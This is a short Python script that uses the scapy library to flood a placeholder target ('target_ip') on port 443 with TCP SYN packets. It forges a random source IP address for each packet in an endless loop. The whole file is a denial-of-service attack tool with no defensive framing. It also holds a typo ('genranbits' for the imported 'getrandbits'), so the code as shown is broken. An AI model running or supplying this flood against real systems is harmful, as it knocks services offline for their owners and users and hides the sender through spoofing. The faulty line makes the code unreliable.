#!/usr/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

def tcp_syn_flood():
    ip = IP(dst="target_ip")
    tcp = TCP(sport=4444, dport=443, seq=4444, flags='S')
    pkt = ip/tcp

    while True:
        pkt["IP"].src = str(IPv4Address(genranbits(32)))
        send(pkt, verbose=0)

if __name__ == "__main__":
    tcp_syn_flood()
